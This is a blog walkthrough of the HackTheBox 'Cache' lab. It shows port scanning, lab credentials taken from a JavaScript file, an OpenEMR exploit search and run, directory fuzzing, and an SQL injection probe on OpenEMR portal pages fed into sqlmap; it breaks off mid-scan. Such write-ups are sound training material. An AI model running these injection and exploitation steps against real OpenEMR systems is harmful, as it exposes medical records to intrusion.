<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Cache | yassine</title><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="Cache" /><meta name="author" content="Mohammad YASSINE" /><meta property="og:locale" content="en_US" /><meta name="description" content="Cache from HackTheBox" /><meta property="og:description" content="Cache from HackTheBox" /><link rel="canonical" href="https://0xyassine.github.io//posts/cache/" /><meta property="og:url" content="https://0xyassine.github.io//posts/cache/" /><meta property="og:site_name" content="yassine" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-05-09T00:00:00+03:00" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Cache from HackTheBox","author":{"@type":"Person","name":"Mohammad YASSINE"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://0xyassine.github.io//posts/cache/"},"@type":"BlogPosting","url":"https://0xyassine.github.io//posts/cache/","headline":"Cache","dateModified":"2020-05-09T00:00:00+03:00","datePublished":"2020-05-09T00:00:00+03:00","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/main.css"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="style" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/syntax.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/syntax.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">yassine</a></div><div id="site-subtitle" class="font-italic">Pentester | CyberSec analyst .</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.facebook.com/mouhamed.yassin.90" target="_blank"> <i class="fab fa-facebook-alt"><b><font color="orange">F</font></b></i> </a> <a href="https://www.linkedin.com/in/mohammad-yassine-8b84041a5/" target="_blank"> <i class="fab fa-linked-alt"><b><font color="orange">L</font></b></i> </a> <a href="https://www.hackthebox.eu/home/users/profile/143843" target="_blank"> <i class="fab fa-linked-alt"><b><font color="orange">H</font></b></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Cache</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Cache</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Sat, May 9, 2020, 12:00 AM +0300"> May 9, 2020 <i class="unloaded">2020-05-09T00:00:00+03:00</i> </span> by <span class="author"> Mohammad YASSINE </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, May 31, 2020, 6:05 PM +0300"> May 31, 2020 <i class="unloaded">2020-05-31T18:05:38+03:00</i> </span></div></div><div class="post-content"><h1 id="cache-from-hackthebox">Cache from HackTheBox</h1><p><br /></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/ce1f92a4-92c5-11ea-bb37-0242ac130002-cache/info.jpg" alt="info" /></p><p>Cache box was interesting . I can say it’s an (easy+) box with sql injection and new privilege escalation techniques <br /> <br /></p><h2 id="nmap-scan">nmap scan</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap cache.htb -sV -sC -v
</pre></table></code></div></div><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">PORT   STATE SERVICE VERSION
</span><span class="gp">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span> protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
</span><span class="gp">Service Info: OS: Linux;</span> CPE: cpe:/o:linux:linux_kernel
<span class="go">
</span></pre></table></code></div></div><h2 id="web-enum">Web enum</h2><p>port <code class="language-plaintext highlighter-rouge">80</code> is open , let’s check the web page …</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/ce1f92a4-92c5-11ea-bb37-0242ac130002-cache/web.jpg" alt="info" /></p><p>There is a lot of info ,enumerating inside the website i found a login page (<code class="language-plaintext highlighter-rouge">http://cache.htb/login.html</code>)</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/ce1f92a4-92c5-11ea-bb37-0242ac130002-cache/login.jpg" alt="info" /></p><p>This page is using <code class="language-plaintext highlighter-rouge">javascript</code>,you can use the <code class="language-plaintext highlighter-rouge">wappalyser</code> firefox extension to get more info about the libraries used.<br /> Cheking the page source using <code class="language-plaintext highlighter-rouge">right click --&gt; View Page Source</code> , found a useful <code class="language-plaintext highlighter-rouge">.js</code> file</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/ce1f92a4-92c5-11ea-bb37-0242ac130002-cache/js.jpg" alt="info" /></p><p><code class="language-plaintext highlighter-rouge">&lt;script src="jquery/functionality.js"&gt;&lt;/script&gt;</code><br /></p><p>By taking a look at this script (<code class="language-plaintext highlighter-rouge">http://cache.htb/jquery/functionality.js</code>) , i was able to get <code class="language-plaintext highlighter-rouge">user</code> and <code class="language-plaintext highlighter-rouge">password</code></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/ce1f92a4-92c5-11ea-bb37-0242ac130002-cache/func.jpg" alt="info" /></p><p>creds : <code class="language-plaintext highlighter-rouge">ash : H@v3_fun</code> . I tried to login with those creds and i got login successful</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/ce1f92a4-92c5-11ea-bb37-0242ac130002-cache/done.jpg" alt="info" /></p><p>Good but nothing interesting in this page :) but let’s remember the creds at least … <br /></p><p>Going back to the <code class="language-plaintext highlighter-rouge">author</code> page (<code class="language-plaintext highlighter-rouge">http://cache.htb/author.html</code>) , i noticed that there is an interesting phrase<br /></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/ce1f92a4-92c5-11ea-bb37-0242ac130002-cache/auth.jpg" alt="info" /></p><p><code class="language-plaintext highlighter-rouge">Check out his other projects like Cache: HMS(Hospital Management System)</code><br /></p><p>This part was a CTF part , i just added <code class="language-plaintext highlighter-rouge">hms.htb</code> to my <code class="language-plaintext highlighter-rouge">hosts</code> file and visited it with my browser</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"10.10.10.188  hms.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><p>Now go to <code class="language-plaintext highlighter-rouge">http://hms.htb</code></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/ce1f92a4-92c5-11ea-bb37-0242ac130002-cache/open.jpg" alt="info" /></p><p>I tried the login creds but not working , then tested for sql injetion also not working .<br /> I used <code class="language-plaintext highlighter-rouge">searchsploit</code> so search for <code class="language-plaintext highlighter-rouge">OpenEMR</code> exploits</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>searchsploit OpenEMR
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/hacktheboxmachine/cache# searchsploit OpenEMR
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                       |  Path
                                                                                                                                                     | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
OpenEMR - 'site' Cross-Site Scripting                                                                                                                | exploits/php/webapps/38328.txt
OpenEMR - Arbitrary '.PHP' File Upload (Metasploit)                                                                                                  | exploits/php/remote/24529.rb
OpenEMR 2.8.1 - 'fileroot' Remote File Inclusion                                                                                                     | exploits/php/webapps/1886.txt
OpenEMR 2.8.1 - 'srcdir' Multiple Remote File Inclusions                                                                                             | exploits/php/webapps/2727.txt
OpenEMR 2.8.2 - 'Import_XML.php' Remote File Inclusion                                                                                               | exploits/php/webapps/29556.txt
OpenEMR 2.8.2 - 'Login_Frame.php' Cross-Site Scripting                                                                                               | exploits/php/webapps/29557.txt
OpenEMR 3.2.0 - SQL Injection / Cross-Site Scripting                                                                                                 | exploits/php/webapps/15836.txt
OpenEMR 4 - Multiple Vulnerabilities                                                                                                                 | exploits/php/webapps/18274.txt
OpenEMR 4.0 - Multiple Cross-Site Scripting Vulnerabilities                                                                                          | exploits/php/webapps/36034.txt
OpenEMR 4.0.0 - Multiple Vulnerabilities                                                                                                             | exploits/php/webapps/17118.txt
OpenEMR 4.1 - '/Interface/fax/fax_dispatch.php?File' 'exec()' Call Arbitrary Shell Command Execution                                                 | exploits/php/webapps/36651.txt
OpenEMR 4.1 - '/Interface/patient_file/encounter/load_form.php?formname' Traversal Local File Inclusion                                              | exploits/php/webapps/36649.txt
OpenEMR 4.1 - '/Interface/patient_file/encounter/trend_form.php?formname' Traversal Local File Inclusion                                             | exploits/php/webapps/36648.txt
OpenEMR 4.1 - '/contrib/acog/print_form.php?formname' Traversal Local File Inclusion                                                                 | exploits/php/webapps/36650.txt
OpenEMR 4.1 - 'note' HTML Injection                                                                                                                  | exploits/php/webapps/38654.txt
OpenEMR 4.1.1 - 'ofc_upload_image.php' Arbitrary File Upload                                                                                         | exploits/php/webapps/24492.php
OpenEMR 4.1.1 Patch 14 - Multiple Vulnerabilities                                                                                                    | exploits/php/webapps/28329.txt
OpenEMR 4.1.1 Patch 14 - SQL Injection / Privilege Escalation / Remote Code Execution (Metasploit)                                                   | exploits/php/remote/28408.rb
OpenEMR 4.1.2(7) - Multiple SQL Injections                                                                                                           | exploits/php/webapps/35518.txt
OpenEMR 5.0.0 - OS Command Injection / Cross-Site Scripting                                                                                          | exploits/php/webapps/43232.txt
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                                                                                             | exploits/linux/webapps/45202.txt
OpenEMR &lt; 5.0.1 - (Authenticated) Remote Code Execution                                                                                              | exploits/php/webapps/45161.py
OpenEMR Electronic Medical Record Software 3.2 - Multiple Vulnerabilities                                                                            | exploits/php/webapps/14011.txt
Openemr-4.1.0 - SQL Injection                                                                                                                        | exploits/php/webapps/17998.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
</pre></table></code></div></div><p>Well , a lot of exploits . I have <code class="language-plaintext highlighter-rouge">OpenEMR 2018</code> , if you search google for <code class="language-plaintext highlighter-rouge">2018</code> year , you get <code class="language-plaintext highlighter-rouge">5.0.1</code> so i have <code class="language-plaintext highlighter-rouge">Remote Code Execution</code> .<br /> Let’s grab the exploit</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>searchsploit <span class="nt">-m</span> exploits/php/webapps/45161.py
</pre></table></code></div></div><p>I tried the exploit with the creds that i have but it fail</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python 45161.py -u ash -p H@v3_fun http://hms.htb
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/hacktheboxmachine/cache# python 45161.py -u ash -p H@v3_fun http://hms.htb
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with ash:H@v3_fun
[-] Failed to Login.
root@kali:~/Desktop/hacktheboxmachine/cache# 
</pre></table></code></div></div><p>Credentials problem , so we need to get more <code class="language-plaintext highlighter-rouge">creds</code><br /> I used Wfuzz to see if there is more <code class="language-plaintext highlighter-rouge">directories</code> …</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wfuzz <span class="nt">-u</span> http://hms.htb/FUZZ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">--hc</span> 404 <span class="nt">-c</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/hacktheboxmachine/cache# wfuzz -u http://hms.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 404 -c

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://hms.htb/FUZZ
Total requests: 4614

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                      
===================================================================

000000001:   302        0 L      0 W      0 Ch        ""                                                                                                                           
000000012:   403        9 L      28 W     272 Ch      ".htaccess"                                                                                                                  
000000013:   403        9 L      28 W     272 Ch      ".htpasswd"                                                                                                                  
000000011:   403        9 L      28 W     272 Ch      ".hta"                                                                                                                       
000000290:   200        35 L     77 W     937 Ch      "admin.php"                                                                                                                  
000000956:   301        9 L      28 W     303 Ch      "common"                                                                                                                     
000000994:   301        9 L      28 W     303 Ch      "config"                                                                                                                     
000001034:   301        9 L      28 W     304 Ch      "contrib"                                                                                                                    
000001039:   301        9 L      28 W     308 Ch      "controllers"                                                                                                                
000001121:   301        9 L      28 W     303 Ch      "custom"                                                                                                                     
000001991:   301        9 L      28 W     303 Ch      "images"                                                                                                                     
000002021:   302        0 L      0 W      0 Ch        "index.php"                                                                                                                  
000002081:   301        9 L      28 W     306 Ch      "interface"                                                                                                                  
000002145:   301        9 L      28 W     307 Ch      "javascript"                                                                                                                 
000002277:   301        9 L      28 W     304 Ch      "library"                                                                                                                    
000002282:   200        674 L    5644 W   35147 Ch    "LICENSE"                                                                                                                    
000002567:   301        9 L      28 W     304 Ch      "modules"                                                                                                                    
000003043:   301        9 L      28 W     303 Ch      "portal"                                                                                                                     
000003207:   301        9 L      28 W     303 Ch      "public"                                                                                                                     
000003588:   403        9 L      28 W     272 Ch      "server-status"                                                                                                              
000003591:   301        9 L      28 W     305 Ch      "services"                                                                                                                   
000003699:   301        9 L      28 W     302 Ch      "sites"                                                                                                                      
000003793:   301        9 L      28 W     300 Ch      "sql"                                                                                                                        
000003995:   301        9 L      28 W     306 Ch      "templates"                                                                                                                  
000004021:   301        9 L      28 W     302 Ch      "tests"                                                                                                                      
000004286:   301        9 L      28 W     303 Ch      "vendor"                                                                                                                     

Total time: 99.97864
Processed Requests: 4614
Filtered Requests: 4588
Requests/sec.: 46.14985
</pre></table></code></div></div><p>Usually <code class="language-plaintext highlighter-rouge">portal</code> is also a login page , let’s check it by going to <code class="language-plaintext highlighter-rouge">http://hms.htb/portal/</code></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/ce1f92a4-92c5-11ea-bb37-0242ac130002-cache/portal.jpg" alt="info" /></p><p>Also tested for sql injection but not working , i searched google for <code class="language-plaintext highlighter-rouge">openemr 2018 portal exploit</code> and taked a look at <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-12269/product_id-23156/Open-emr-Openemr.html">cvedetails</a></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/ce1f92a4-92c5-11ea-bb37-0242ac130002-cache/sqli.jpg" alt="info" /></p><p><code class="language-plaintext highlighter-rouge">portal/add_edit_event_user.php</code> in versions of OpenEMR before 5.0.1.4 allow a remote attacker to execute arbitrary SQL commands via the (1) <code class="language-plaintext highlighter-rouge">eid</code>, (2) <code class="language-plaintext highlighter-rouge">userid</code>, or (3) pid parameter.<br /></p><h2 id="sql-injection">Sql injection</h2><p>the <code class="language-plaintext highlighter-rouge">eid</code> parameter in <code class="language-plaintext highlighter-rouge">add_edit_event_user.php</code> is vulnerable to <code class="language-plaintext highlighter-rouge">sql injection</code>.<br /> I verified that by visiting <code class="language-plaintext highlighter-rouge">http://hms.htb/portal/add_edit_event_user.php?eid=1'</code></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/ce1f92a4-92c5-11ea-bb37-0242ac130002-cache/error.jpg" alt="info" /></p><blockquote><p>Note : if you want , also you can use <code class="language-plaintext highlighter-rouge">http://hms.htb/portal/find_appt_popup_user.php?catid=1'</code> (CVE-2018-15143)</p></blockquote><p>I will use <code class="language-plaintext highlighter-rouge">http://hms.htb/portal/find_appt_popup_user.php?catid=1'</code> because it was more stable …<br /> Intercept any of those requests with <code class="language-plaintext highlighter-rouge">burpsuite</code> then save the <code class="language-plaintext highlighter-rouge">request</code> to a file called <code class="language-plaintext highlighter-rouge">req</code> to test it with <code class="language-plaintext highlighter-rouge">sqlmap</code></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/ce1f92a4-92c5-11ea-bb37-0242ac130002-cache/map.jpg" alt="info" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/hacktheboxmachine/cache# cat req 
GET /portal/find_appt_popup_user.php?catid=1%27 HTTP/1.1
Host: hms.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=nnng18tcqjubhkr562lar0jiu1; OpenEMR=kml2shsb5g1sekgod6n2j3k3ub
Upgrade-Insecure-Requests: 1
root@kali:~/Desktop/hacktheboxmachine/cache# 
</pre></table></code></div></div><p>Now try to dump databases with <code class="language-plaintext highlighter-rouge">sqlmap</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-r</span> req <span class="nt">--dbs</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/hacktheboxmachine/cache# sqlmap -r req --dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:49:33 /2020-05-10/

[15:49:33] [INFO] parsing HTTP request from 'req'
[15:49:33] [INFO] testing connection to the target URL
[15:49:34] [INFO] checking if the target is protected by some kind of WAF/IPS
[15:49:34] [INFO] testing if the target URL content is stable
[15:49:35] [INFO] target URL content is stable
[15:49:35] [INFO] testing if GET parameter 'catid' is dynamic
[15:49:35] [WARNING] GET parameter 'catid' does not appear to be dynamic
[15:49:35] [INFO] heuristic (basic) test shows that GET parameter 'catid' might be injectable (possible DBMS: 'MySQL')
[15:49:35] [INFO] testing for SQL injection on GET parameter 'catid'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[15:49:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:49:41] [WARNING] reflective value(s) found and filtering out
[15:49:44] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:49:44] [INFO] testing 'Generic inline queries'
